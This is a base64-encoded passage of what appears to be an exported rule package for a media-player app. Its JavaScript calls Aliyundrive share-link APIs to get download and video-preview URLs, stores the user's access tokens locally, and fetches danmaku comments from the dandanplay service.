knOiAnY2xpZW50PXdlYixhcHA9c2hhcmUsdmVyc2lvbj12Mi4zLjEnLFxcbiAgICAgICAgICAgICd4LXNoYXJlLXRva2VuJzogdGhpcy5zaGFyZVRva2VuXFxuICAgICAgICB9LCAoZSkgPT4ge1xcbiAgICAgICAgICAgIHRoaXMudHJ5U29sdmUoZSk7XFxuICAgICAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0aGlzLnJlYWNjZXNzVGssXFxuICAgICAgICAgICAgICAgICAgICAneC1zaGFyZS10b2tlbic6IHRoaXMuc2hhcmVUb2tlblxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgICAgICBsZXQgY29kZSA9IHJlc3VsdC5yZWRpcmVjdFVyaS5zcGxpdChcXFwiY29kZT1cXFwiKVsxXTtcXG4gICAgICAgIHJldHVybiB0aGlzLl9nZXRPcGVuVG9rZW4oY29kZSk7XFxuICAgIH0sXFxuICAgIHJlZnJlc2hPcGVuVG9rZW4oKSB7XFxuICAgICAgICBpZiAodGhpcy5vcGVuVG9rZW5zLlJlZnJlc2hUb2tlbk9wZW4gJiYgdGhpcy5vcGVuVG9rZW5zLkJpbmRSZWZyZXNoVG9rZW4gPT09IHRoaXMuYWxpVG9rZW5zLnJlZnJlc2hfdG9rZW4pIHtcXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fZ2V0T3BlblRva2VuKCk7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiB0aGlzLmNhY2hlT3BlblRva2VuKCk7XFxuICAgICAgICB9XFxuICAgIH0sXFxuICAgIF9jbG91ZEZpbGVPcGVyYXRlKGJvZHksIGNsb3VkRmlsZUlkLCBvcGVyYXRlVXJsKSB7XFxuICAgICAgICBsZXQgcmVzdWx0ID0gcG9zdEFwaSgnaHR0cHM6Ly9hcGkuYWxpeXVuZHJpdmUuY29tL2Fkcml2ZS92Mi9iYXRjaCcsIHtcXG4gICAgICAgICAgICBcXFwicmVxdWVzdHNcXFwiOiBbe1xcbiAgICAgICAgICAgICAgICBcXFwiYm9keVxcXCI6IGJvZHksXFxuICAgICAgICAgICAgICAgIFxcXCJoZWFkZXJzXFxcIjoge1xcbiAgICAgICAgICAgICAgICAgICAgXFxcIkNvbnRlbnQtVHlwZVxcXCI6IFxcXCJhcHBsaWNhdGlvbi9qc29uXFxcIlxcbiAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICBcXFwiaWRcXFwiOiBjbG91ZEZpbGVJZCB8fCBcXFwiMFxcXCIsXFxuICAgICAgICAgICAgICAgIFxcXCJtZXRob2RcXFwiOiBcXFwiUE9TVFxcXCIsXFxuICAgICAgICAgICAgICAgIFxcXCJ1cmxcXFwiOiBvcGVyYXRlVXJsXFxuICAgICAgICAgICAgfV0sXFxuICAgICAgICAgICAgXFxcInJlc291cmNlXFxcIjogXFxcImZpbGVcXFwiXFxuICAgICAgICB9LCB7XFxuICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBQQ19VQSxcXG4gICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vJyxcXG4gICAgICAgICAgICAnYXV0aG9yaXphdGlvbic6IHRoaXMucmVhY2Nlc3NUayxcXG4gICAgICAgICAgICAvL2dldEFjY2Vzc1Rva2VuXFxuICAgICAgICAgICAgJ3gtY2FuYXJ5JzogJ2NsaWVudD13ZWIsYXBwPXNoYXJlLHZlcnNpb249djIuMy4xJyxcXG4gICAgICAgICAgICAneC1zaGFyZS10b2tlbic6IHRoaXMuc2hhcmVUb2tlblxcblxcbiAgICAgICAgfSwgKGUsIHIsIGIpID0+IHtcXG4gICAgICAgICAgICBpZiAoZS5jb2RlID09PSBcXFwiUXVvdGFFeGhhdXN0ZWQuRHJpdmVcXFwiKSB7XFxuICAgICAgICAgICAgICAgIHRocm93IGU7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGlmKCF0aGlzLnRyeVNvbHZlKGUpKXtcXG4gICAgICAgICAgICAgICAgdGhpcy53YWl0U2xlZXAoMjApLnJlZnJlc2hBY2Nlc3NUb2tlbigpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGxldCBib2R5ID0gYi5yZXF1ZXN0c1swXS5ib2R5O1xcbiAgICAgICAgICAgIGlmIChib2R5LmRyaXZlX2lkKSB7XFxuICAgICAgICAgICAgICAgIGJvZHkuZHJpdmVfaWQgPSB0aGlzLmRlZkRyaXZlSWRcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgaWYgKGJvZHkudG9fZHJpdmVfaWQpIHtcXG4gICAgICAgICAgICAgICAgYm9keS50b19kcml2ZV9pZCA9IHRoaXMuZGVmRHJpdmVJZFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4ge1xcbiAgICAgICAgICAgICAgICBib2R5OiBiLFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxuICAgICAgICAgICAgICAgICAgICAnYXV0aG9yaXphdGlvbic6IHRoaXMucmVhY2Nlc3NUayxcXG4gICAgICAgICAgICAgICAgICAgICd4LXNoYXJlLXRva2VuJzogdGhpcy5zaGFyZVRva2VuXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9O1xcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcbiAgICB9LFxcbiAgICBjb3B5RmlsZVRvQ2xvdWRGaWxlKGZpbGVJZCwgcmV0cnkpIHtcXG4gICAgICAgIGxldCByZXN1bHQgPSB0aGlzLl9jbG91ZEZpbGVPcGVyYXRlKHtcXG4gICAgICAgICAgICBcXFwiZmlsZV9pZFxcXCI6IGZpbGVJZCxcXG4gICAgICAgICAgICBcXFwic2hhcmVfaWRcXFwiOiB0aGlzLnNoYXJlSWQsXFxuICAgICAgICAgICAgXFxcImF1dG9fcmVuYW1lXFxcIjogdHJ1ZSxcXG4gICAgICAgICAgICBcXFwidG9fcGFyZW50X2ZpbGVfaWRcXFwiOiBcXFwicm9vdFxcXCIsXFxuICAgICAgICAgICAgXFxcInRvX2RyaXZlX2lkXFxcIjogdGhpcy5kZWZEcml2ZUlkXFxuICAgICAgICB9LCBcXFwiMFxcXCIsIFxcXCIvZmlsZS9jb3B5XFxcIik7XFxuICAgICAgICBsZXQgYm9keSA9IHJlc3VsdCAmJiByZXN1bHQucmVzcG9uc2VzICYmIHJlc3VsdC5yZXNwb25zZXNbMF0gJiYgcmVzdWx0LnJlc3BvbnNlc1swXS5ib2R5IHx8IHt9O1xcbiAgICAgICAgaWYgKCFib2R5LmZpbGVfaWQgJiYgIXJldHJ5KSB7XFxuICAgICAgICAgICAgdGhpcy53YWl0U2xlZXAoMjApLmdldFNoYXJlVG9rZW4oKTtcXG4gICAgICAgICAgICB0aGlzLndhaXRTbGVlcCgyMCkucmVmcmVzaEFjY2Vzc1Rva2VuKCk7XFxuICAgICAgICAgICAgcmV0dXJuIHRoaXMud2FpdFNsZWVwKDIwKS5jb3B5RmlsZVRvQ2xvdWRGaWxlKGZpbGVJZCwgdHJ1ZSk7XFxuICAgICAgICB9IGVsc2UgaWYgKCFib2R5LmZpbGVfaWQpIHtcXG4gICAgICAgICAgICBsZXQgZSA9IG5ldyBFcnJvcihcXFwi5paH5Lu25aSN5Yi25aSx6LSlOlxcXFxuXFxcIiArIEpTT04uc3RyaW5naWZ5KHJlc3VsdCkpO1xcbiAgICAgICAgICAgIGUuY29kZSA9IGJvZHkuY29kZTtcXG4gICAgICAgICAgICB0aHJvdyBlO1xcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIHJlc3VsdC5yZXNwb25zZXNbMF0uYm9keS5maWxlX2lkO1xcbiAgICB9LFxcbiAgICBvcGVuQ2xvdWRGaWxlVG9Eb3duVXJsKGNsb3VkRmlsZUlkKSB7XFxuICAgICAgICBsZXQgZmlsZUluZm8gPSBwb3N0QXBpKCdodHRwczovL29wZW4uYWxpeXVuZHJpdmUuY29tL2Fkcml2ZS92MS4wL29wZW5GaWxlL2dldERvd25sb2FkVXJsJywge1xcbiAgICAgICAgICAgICdmaWxlX2lkJzogY2xvdWRGaWxlSWQsXFxuICAgICAgICAgICAgJ2RyaXZlX2lkJzogdGhpcy5kZWZEcml2ZUlkXFxuICAgICAgICB9LCB7XFxuICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBQQ19VQSxcXG4gICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vJyxcXG4gICAgICAgICAgICAnYXV0aG9yaXphdGlvbic6IHRoaXMub3BlblRva2Vucy5BY2Nlc3NUb2tlbk9wZW5cXG4gICAgICAgIH0sICgpID0+IHtcXG4gICAgICAgICAgICB0aGlzLndhaXRTbGVlcCgzMCkucmVmcmVzaE9wZW5Ub2tlbigpO1xcbiAgICAgICAgICAgIHJldHVybiB7XFxuICAgICAgICAgICAgICAgIGJvZHk6IHtcXG4gICAgICAgICAgICAgICAgICAgICdkcml2ZV9pZCc6IHRoaXMuZGVmRHJpdmVJZCxcXG4gICAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0aGlzLm9wZW5Ub2tlbnMuQWNjZXNzVG9rZW5PcGVuXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9O1xcbiAgICAgICAgfSwgMik7XFxuICAgICAgICBpZiAoIWZpbGVJbmZvLnVybCB8fCBmaWxlSW5mby5jb2RlKSB0aHJvdyBuZXcgRXJyb3IoXFxcIuS4i+i9vemTvuaOpeiOt+WPluWksei0pVxcXFxuXFxcIiArIGZpbGVJbmZvLmNvZGUgKyBcXFwiOlxcXCIgKyBmaWxlSW5mby5tZXNzYWdlKTtcXG4gICAgICAgIHJldHVybiBmaWxlSW5mby51cmw7XFxuICAgIH0sXFxuICAgIGRlbGV0ZWVDbG91ZEZpbGUoY2xvdWRGaWxlSWQpIHtcXG4gICAgICAgIGxldCByZXN1bHQgPSB0aGlzLl9jbG91ZEZpbGVPcGVyYXRlKHtcXG4gICAgICAgICAgICBcXFwiZHJpdmVfaWRcXFwiOiB0aGlzLmRlZkRyaXZlSWQsXFxuICAgICAgICAgICAgXFxcImZpbGVfaWRcXFwiOiBjbG91ZEZpbGVJZFxcbiAgICAgICAgfSwgY2xvdWRGaWxlSWQsIFxcXCIvZmlsZS9kZWxldGVcXFwiKTtcXG4gICAgICAgIHJldHVybiByZXN1bHQ7XFxuICAgIH0sXFxuICAgIGdldFZpZGVvVGVtUGxheVVybChmaWxlSWQpIHtcXG4gICAgICAgIGxldCBjbG91ZEZpbGVJZCA9IHRoaXMuY29weUZpbGVUb0Nsb3VkRmlsZShmaWxlSWQpO1xcbiAgICAgICAgdGhpcy53YWl0U2xlZXAoMjApO1xcbiAgICAgICAgbGV0IHBsYXlVcmwgPSB0aGlzLm9wZW5DbG91ZEZpbGVUb0Rvd25VcmwoY2xvdWRGaWxlSWQpO1xcbiAgICAgICAgdGhpcy53YWl0U2xlZXAoNTApO1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICB0aGlzLmRlbGV0ZWVDbG91ZEZpbGUoY2xvdWRGaWxlSWQpO1xcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIGxvZyhcXFwiI+aWh+S7tuWIoOmZpOWksei0pSNcXFxcbumUmeivr+S/oeaBrz5cXFwiICsgZS50b1N0cmluZygpICsgXFxcIlxcXFxu6ZSZ6K+v6KGMPlxcXCIgKyBlLmxpbmVOdW1iZXIpO1xcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIHBsYXlVcmw7XFxuICAgIH0sXFxuICAgIGdldEZpbGVUb0Rvd25VcmwoZmlsZUlkKSB7XFxuICAgICAgICBsZXQgZG93bmxvYWRJbmZvID0gcG9zdEFwaShcXFwiL3YyL2ZpbGUvZ2V0X3NoYXJlX2xpbmtfZG93bmxvYWRfdXJsXFxcIiwge1xcbiAgICAgICAgICAgIFxcXCJleHBpcmVfc2VjXFxcIjogNjAwLFxcbiAgICAgICAgICAgIFxcXCJmaWxlX2lkXFxcIjogZmlsZUlkLFxcbiAgICAgICAgICAgIFxcXCJzaGFyZV9pZFxcXCI6IHRoaXMuc2hhcmVJZFxcbiAgICAgICAgfSwge1xcbiAgICAgICAgICAgIFxcXCJYLVNoYXJlLVRva2VuXFxcIjogdGhpcy5zaGFyZVRva2VuLFxcbiAgICAgICAgICAgIFxcXCJhdXRob3JpemF0aW9uXFxcIjogdGhpcy5hbGlUb2tlbnMuYWNjZXNzX3Rva2VuXFxuICAgICAgICB9LCAoZSkgPT4ge1xcbiAgICAgICAgICAgIHRoaXMudHJ5U29sdmUoZSk7XFxuICAgICAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgXFxcIlgtU2hhcmUtVG9rZW5cXFwiOiB0aGlzLnNoYXJlVG9rZW4sXFxuICAgICAgICAgICAgICAgICAgICBcXFwiYXV0aG9yaXphdGlvblxcXCI6IHRoaXMuYWxpVG9rZW5zLmFjY2Vzc190b2tlblxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfTtcXG4gICAgICAgIH0pO1xcbiAgICAgICAgcmV0dXJuIGRvd25sb2FkSW5mby5kb3dubG9hZF91cmw7XFxuICAgIH0sXFxuICAgIGdldFNpZ24oKSB7XFxuICAgICAgICBpZiAoIXRoaXMuYWxpVG9rZW5zLmRldmljZV9pZCkge1xcbiAgICAgICAgICAgIHRoaXMud2FpdFNsZWVwKDIwKS5yZWZyZXNoQWNjZXNzVG9rZW4oKTtcXG4gICAgICAgIH1cXG4gICAgICAgIGxldCBjYWxjdWxhdGVOZXdTaWduID0gKCkgPT4ge1xcbiAgICAgICAgICAgIGxldCBzaWduID0ganVzdFRlc3RTaWduKFxcXCI1ZGRlNGUxYmRmOWU0OTY2YjM4N2JhNThmNGIzZmRjM1xcXCIsIHRoaXMuYWxpVG9rZW5zLmRldmljZV9pZCwgdGhpcy5hbGlUb2tlbnMudXNlcl9pZCkuc3BsaXQoXFxcIiMjXFxcIik7XFxuICAgICAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICAgICAgc2lnbmF0dXJlOiBzaWduLmF0KDApLFxcbiAgICAgICAgICAgICAgICBwdWJLZXk6IHNpZ24uYXQoLTEpXFxuICAgICAgICAgICAgfTtcXG4gICAgICAgIH07XFxuICAgICAgICBsZXQgbmV3U2lnbiA9IGNhbGN1bGF0ZU5ld1NpZ24oKTtcXG4gICAgICAgIGxldCByZXN1bHQgPSBwb3N0QXBpKCcvdXNlcnMvdjEvdXNlcnMvZGV2aWNlL2NyZWF0ZV9zZXNzaW9uJywge1xcbiAgICAgICAgICAgIFxcXCJkZXZpY2VOYW1lXFxcIjogXFxcIkVkZ2XmtY/op4jlmahcXFwiLFxcbiAgICAgICAgICAgIFxcXCJtb2RlbE5hbWVcXFwiOiBcXFwiV2luZG93c+e9kemhteeJiFxcXCIsXFxuICAgICAgICAgICAgXFxcInB1YktleVxcXCI6IG5ld1NpZ24ucHViS2V5LFxcbiAgICAgICAgfSwge1xcbiAgICAgICAgICAgICdVc2VyLUFnZW50JzogUENfVUEsXFxuICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tJyxcXG4gICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IHRoaXMucmVhY2Nlc3NUayxcXG4gICAgICAgICAgICAnWC1TaGFyZS1Ub2tlbic6IHRoaXMuc2hhcmVUb2tlbixcXG4gICAgICAgICAgICAneC1kZXZpY2UtaWQnOiB0aGlzLmFsaVRva2Vucy5kZXZpY2VfaWQsXFxuICAgICAgICAgICAgJ3gtc2lnbmF0dXJlJzogbmV3U2lnbi5zaWduYXR1cmVcXG4gICAgICAgIH0sIChlKSA9PiB7XFxuICAgICAgICAgICAgaWYgKGUubWVzc2FnZSA9PT0gXFxcIngtZGV2aWNlLWlkIGVtcHR5XFxcIikge1xcbiAgICAgICAgICAgICAgICB0aGlzLndhaXRTbGVlcCgyMCkucmVmcmVzaEFjY2Vzc1Rva2VuKCk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHRoaXMudHJ5U29sdmUoZSk7XFxuICAgICAgICAgICAgdGhpcy53YWl0U2xlZXAoNTApO1xcbiAgICAgICAgICAgIG5ld1NpZ24gPSBjYWxjdWxhdGVOZXdTaWduKCk7XFxuICAgICAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICAgICAgYm9keToge1xcbiAgICAgICAgICAgICAgICAgICAgXFxcInB1YktleVxcXCI6IG5ld1NpZ24ucHViS2V5XFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgICdBdXRob3JpemF0aW9uJzogdGhpcy5yZWFjY2Vzc1RrLFxcbiAgICAgICAgICAgICAgICAgICAgJ1gtU2hhcmUtVG9rZW4nOiB0aGlzLnNoYXJlVG9rZW4sXFxuICAgICAgICAgICAgICAgICAgICAneC1kZXZpY2UtaWQnOiB0aGlzLmFsaVRva2Vucy5kZXZpY2VfaWQsXFxuICAgICAgICAgICAgICAgICAgICAneC1zaWduYXR1cmUnOiBuZXdTaWduLnNpZ25hdHVyZVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSwgMyk7XFxuICAgICAgICBpZiAocmVzdWx0LnN1Y2Nlc3MpIHtcXG4gICAgICAgICAgICByZXR1cm4gbmV3U2lnbjtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXCJTaWdu6I635Y+W5aSx6LSl77yM6K+36YeN6K+V44CCXFxcXG5jb2RlOlxcXCIgKyAocmVzdWx0LmNvZGUgfHwgXFxcIlxcXCIpICsgXFxcIlxcXFxubWVzc2FnZTpcXFwiICsgKHJlc3VsdC5tZXNzYWdlIHx8IFxcXCJcXFwiKSk7XFxuICAgICAgICB9XFxuICAgIH0sXFxuICAgIGdldFNoYXJlVmlkZW9QcmV2aWV3KGZpbGVJZCkge1xcbiAgICAgICAgbGV0IHNpZ24gPSB0aGlzLmdldFNpZ24oKTtcXG4gICAgICAgIGxldCBqc29uID0gSlNPTi5wYXJzZShyZXF1ZXN0KCdodHRwczovL2FwaS5hbGl5dW5kcml2ZS5jb20vdjIvZmlsZS9nZXRfc2hhcmVfbGlua192aWRlb19wcmV2aWV3X3BsYXlfaW5mbycsIHtcXG4gICAgICAgICAgICBoZWFkZXJzOiB7XFxuICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04JyxcXG4gICAgICAgICAgICAgICAgXFxcIm9yaWdpblxcXCI6IFxcXCJodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb21cXFwiLFxcbiAgICAgICAgICAgICAgICBcXFwicmVmZXJlclxcXCI6IFxcXCJodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vXFxcIixcXG4gICAgICAgICAgICAgICAgXFxcInVzZXItYWdlbnRcXFwiOiBcXFwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjQxXFxcIixcXG4gICAgICAgICAgICAgICAgXFxcIngtY2FuYXJ5XFxcIjogXFxcImNsaWVudD13ZWIsYXBwPWFkcml2ZSx2ZXJzaW9uPXYzLjEuMFxcXCIsXFxuICAgICAgICAgICAgICAgIFxcXCJ4LXNoYXJlLXRva2VuXFxcIjogdGhpcy5zaGFyZVRva2VuLFxcbiAgICAgICAgICAgICAgICBcXFwiZmlsZWlkXFxcIjogdGhpcy5hbGlUb2tlbnMudXNlcl9pZCxcXG4gICAgICAgICAgICAgICAgJ0F1dGhvcml6YXRpb24nOiB0aGlzLnJlYWNjZXNzVGssXFxuICAgICAgICAgICAgICAgICd4LWRldmljZS1pZCc6IHRoaXMuYWxpVG9rZW5zLmRldmljZV9pZCxcXG4gICAgICAgICAgICAgICAgJ3gtc2lnbmF0dXJlJzogc2lnbi5zaWduYXR1cmVcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIGJvZHk6IHtcXG4gICAgICAgICAgICAgICAgXFxcImNhdGVnb3J5XFxcIjogXFxcImxpdmVfdHJhbnNjb2RpbmdcXFwiLFxcbiAgICAgICAgICAgICAgICBcXFwiZmlsZV9pZFxcXCI6IGZpbGVJZCxcXG4gICAgICAgICAgICAgICAgXFxcImdldF9wcmV2aWV3X3VybFxcXCI6IHRydWUsXFxuICAgICAgICAgICAgICAgIFxcXCJzaGFyZV9pZFxcXCI6IHRoaXMuc2hhcmVJZCxcXG4gICAgICAgICAgICAgICAgXFxcInRlbXBsYXRlX2lkXFxcIjogXFxcIlxcXCIsXFxuICAgICAgICAgICAgICAgIFxcXCJnZXRfc3VidGl0bGVfaW5mb1xcXCI6IHRydWVcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxcbiAgICAgICAgICAgIHRpbWVvdXQ6IDMwMDBcXG4gICAgICAgIH0pKTtcXG4gICAgICAgIHJldHVybiBqc29uLnZpZGVvX3ByZXZpZXdfcGxheV9pbmZvLmxpdmVfdHJhbnNjb2RpbmdfdGFza19saXN0LnJldmVyc2UoKTtcXG4gICAgfVxcbn0pO1xcblxcbkFsaUFjY2Vzc0FwaS5jcmVhdGVEZWZhdWx0ID0gZnVuY3Rpb24oc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGFsaVRva2VuLCBvcGVuVG9rZW4sIE1ZX1RJVExFKSB7XFxuICAgIGNvbnN0IHtcXG4gICAgICAgIG9wZW5Ub2tlbnNGaWxlcGF0aCxcXG4gICAgICAgIGFsaVRva2Vuc0ZpbGVwYXRoXFxuICAgIH0gPSAkLnJlcXVpcmUoXFxcInRva2VuUGF0aFxcXCIgKyAoTVlfVElUTEUgPyBcXFwiP3J1bGU9XFxcIiArIE1ZX1RJVExFIDogXFxcIlxcXCIpKTtcXG5cXG4gICAgZnVuY3Rpb24gc2F2ZUFsaVRva2VuKHJlc3VsdCwgYXBpKSB7XFxuICAgICAgICB3cml0ZUZpbGUoYWxpVG9rZW5zRmlsZXBhdGgsIEpTT04uc3RyaW5naWZ5KGFwaS5hbGlUb2tlbnMpKTtcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBzYXZlT3BlblRva2VuKHJlc3VsdCwgYXBpKSB7XFxuICAgICAgICB3cml0ZUZpbGUob3BlblRva2Vuc0ZpbGVwYXRoLCBKU09OLnN0cmluZ2lmeShhcGkub3BlblRva2VucykpO1xcbiAgICB9XFxuXFxuICAgIGZ1bmN0aW9uIHB1dFNoYXJlVG9rZW4ocmVzdWx0KSB7XFxuICAgICAgICBpZiAoTVlfVElUTEUpIHtcXG4gICAgICAgICAgICBzaGFyZVRva2VuID0gcHV0VmFyKE1ZX1RJVExFICsgXFxcIkBcXFwiICsgXFxcImFsaVNoYXJlVG9rZW5cXFwiLCByZXN1bHQpO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBzaGFyZVRva2VuID0gcHV0TXlWYXIoXFxcImFsaVNoYXJlVG9rZW5cXFwiLCByZXN1bHQpO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIGlmICghb3BlblRva2VuICYmIG9wZW5Ub2tlbiAhPT0gbnVsbCAmJiBmaWxlRXhpc3Qob3BlblRva2Vuc0ZpbGVwYXRoKSkge1xcbiAgICAgICAgb3BlblRva2VuID0gJC5yZXF1aXJlKG9wZW5Ub2tlbnNGaWxlcGF0aCk7XFxuICAgIH1cXG4gICAgaWYgKCFhbGlUb2tlbiAmJiBmaWxlRXhpc3QoYWxpVG9rZW5zRmlsZXBhdGgpKSB7XFxuICAgICAgICBhbGlUb2tlbiA9ICQucmVxdWlyZShhbGlUb2tlbnNGaWxlcGF0aCk7XFxuICAgIH1cXG4gICAgaWYgKE1ZX1RJVExFKSB7XFxuICAgICAgICBzaGFyZVRva2VuID0gZ2V0VmFyKE1ZX1RJVExFICsgXFxcIkBcXFwiICsgXFxcImFsaVNoYXJlVG9rZW5cXFwiLCBzaGFyZVRva2VuKTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHNoYXJlVG9rZW4gPSBnZXRNeVZhcihcXFwiYWxpU2hhcmVUb2tlblxcXCIsIHNoYXJlVG9rZW4pO1xcbiAgICB9XFxuICAgIHJldHVybiBuZXcgQWxpQWNjZXNzQXBpKHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCBhbGlUb2tlbiwgb3BlblRva2VuLCBwdXRTaGFyZVRva2VuLCBzYXZlQWxpVG9rZW4sIHNhdmVPcGVuVG9rZW4pO1xcbn1cXG4kLmV4cG9ydHMgPSBBbGlBY2Nlc3NBcGk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCJUb2tlbui3r+W+hFwiLFwicGF0aFwiOlwidG9rZW5QYXRoXCIsXCJydWxlXCI6XCIkLmV4cG9ydHM9e1xcbiAgICBcXFwib3BlblRva2Vuc0ZpbGVwYXRoXFxcIjogXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvTG95RGdJay9hbGlPcGVuVG9rZW4uanNvblxcXCIsXFxuICAgIFxcXCJhbGlUb2tlbnNGaWxlcGF0aFxcXCI6IFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL0xveURnSWsvYWxpVG9rZW4uanNvblxcXCJcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLlvLnluZXlt6XlhbdcIixcInBhdGhcIjpcImRhbm11XCIsXCJydWxlXCI6XCJqczpcXG5sZXQgYmFzaWNVcmwgPSBcXFwiaHR0cHM6Ly9hcGkuZGFuZGFucGxheS5uZXQvXFxcIjtcXG5sZXQgc2V2ZVBhdGggPSBcXFwiaGlrZXI6Ly9maWxlcy9jYWNoZS9kYW5tdS9cXFwiO1xcbiQuZXhwb3J0cy5nZXREYW5NdSA9IGZ1bmN0aW9uKGtleSkge1xcbiAgICByZXR1cm4gSlNPTi5wYXJzZShyZXF1ZXN0KGJhc2ljVXJsICsgXFxcImFwaS92Mi9zZWFyY2gvZXBpc29kZXM/YW5pbWU9XFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChkZWNvZGVVUklDb21wb25lbnQoa2V5KSkpKTtcXG59XFxuXFxuZnVuY3Rpb24gZW5jb2RlSHRtbChzKSB7XFxuICAgIGxldCBSRUdYX0hUTUxfRU5DT0RFID0gL+KAnHwmfOKAmXxcXFxcdTAwM0N8PnxbXFxcXHgwMC1cXFxceDIwXXxbXFxcXHg3Ri1cXFxceEZGXXxbXFxcXHUwMTAwLVxcXFx1MjcwMF0vZztcXG4gICAgcmV0dXJuIHMucmVwbGFjZShSRUdYX0hUTUxfRU5DT0RFLCBmdW5jdGlvbigkMCkge1xcbiAgICAgICAgdmFyIGMgPSAkMC5jaGFyQ29kZUF0KDApLFxcbiAgICAgICAgICAgIHIgPSBbXFxcIiYjXFxcIl07XFxuICAgICAgICBjID0gKGMgPT0gMHgyMCkgPyAweEEwIDogYztcXG4gICAgICAgIHIucHVzaChjKTtcXG4gICAgICAgIHIucHVzaChcXFwiO1xcXCIpO1xcbiAgICAgICAgcmV0dXJuIHIuam9pbihcXFwiXFxcIik7XFxuICAgIH0pO1xcbn1cXG5cXG5cXG5cXG4vLzDpu5jorqQgMeeugOS9kyAy57mB5L2TXFxuJC5leHBvcnRzLmRvd25sb2FkRGFuTXUgPSBmdW5jdGlvbihlcGlzb2RlSWQsIG5hbWUpIHtcXG4gICAgbGV0IGRhbk11RGF0YSA9IEpTT04ucGFyc2UocmVxdWVzdChidWlsZFVybChiYXNpY1VybCArIFxcXCIvYXBpL3YyL2NvbW1lbnQvXFxcIiArIGVwaXNvZGVJZCwge1xcbiAgICAgICAgd2l0aFJlbGF0ZWQ6IHRydWUsXFxuICAgICAgICBjaENvbnZlcnQ6IDFcXG4gICAgfSkpKTtcXG4gICAgbGV0IGRNY29udGV4dCA9IFxcXCJcXFwiO1xcbiAgICBmb3IgKGxldCBjb21tZW50IG9mIGRhbk11RGF0YS5jb21tZW50cykge1xcbiAgICAgICAgLy9kTWNvbnRleHQgKz0gYDxkIHA9XFxcIiR7TWF0aC5yb3VuZCh0aW1lcG9pbnQpfSwke2N0fSwke3NpemV9LCR7Y29sb3J9LDBcXFwiPiR7Y29udGVudH08L2Q+XFxcXG5gO1xcbiAgICAgICAgbGV0IHBhcmFtVGV4dCA9IGNvbW1lbnQucDtcXG4gICAgICAgIGxldCBjb21tZW50VGV4dCA9IGNvbW1lbnQubTtcXG4gICAgICAgIGlmIChwYXJhbVRleHQgPT0gbnVsbCB8fCBjb21tZW50VGV4dCA9PSBud